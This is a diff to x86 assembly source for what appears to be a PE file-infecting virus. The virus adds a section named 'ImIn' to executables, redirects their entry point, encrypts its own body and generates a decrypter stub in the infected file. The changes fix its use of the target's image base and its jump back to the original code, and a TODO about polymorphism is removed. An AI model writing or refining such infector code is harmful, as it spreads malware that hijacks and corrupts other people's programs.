@@ -67,6 +67,13 @@ nop
 nop
 
 endDecrypter:
+; Replace the Jmp from the EP do the old data 
+nop
+nop
+nop
+nop
+nop
+
 ; Jmp data
 jmp	start
 
@@ -78,6 +85,7 @@ HandleSearch		dd		?
 NewSectionName		db		"ImIn", 0
 
 ; PE
+BaseImage		dd	?
 OldEntryPoint		dd	?
 PeFile			dd	?
 PeMapObject		dd	?
@@ -144,7 +152,6 @@ STime		_SYSTEMTIME	<>
 
 ; TODO
 ; Seek TODO
-; Polymorphism : Create decrypter, copy it, copy opcode encrypted (Add this to the size ?)
 
 start:
 ; Delta offset for PIC
@@ -291,8 +298,13 @@ mov	[DELTA PeSectionNb], eax
 xor	ecx, ecx
 mov	cx, word ptr[eax]
 
+; GET IMAGE BASE
+add	eax, 02Eh
+mov	esi, [eax]
+mov	[DELTA BaseImage], esi
+
 ; GET ALIGNMENT
-add	eax, 032h
+add	eax, 04h
 mov	esi, [eax]
 mov	[DELTA SectionAlignment], esi
 add	eax, 04h
@@ -405,9 +417,6 @@ mov	[edi], ecx
 
 
 ; CHANGE PE PROPERTIES
-; TODO CHANGE SIZE OF CODE
-; TODO CHANGE SIZE OF HEADERS
-; SizeOfCode : Old + SizeOfRawData aligned on SectionAlignment
 mov	eax, [DELTA PeNtHeader]
 add	eax, 01Ch
 ; CHANGE ENTRY POINT
@@ -503,14 +512,14 @@ xor	eax, edx ; encrypt
 stosd
 
 ; CREATING DECRYPTER
-DECRYPTER_SIZE	=	25
+DECRYPTER_SIZE = 25
 mov	edi, [DELTA PeFileMap]
 add	edi, [DELTA PointerToRawData]
 mov	eax, 0BFh ; Mov edi
 stosb
 mov	eax, DECRYPTER_SIZE ; Decrypter Size
-add	eax, 0400000h ; TODO - Get BA
-add	eax, [DELTA VirtualAddress]
+add	eax, [DELTA BaseImage]
+add	eax, [DELTA VirtualAddress] ; Address of our section
 stosd
 mov	eax, 0F78Bh ; mov esi, edi
 stosw
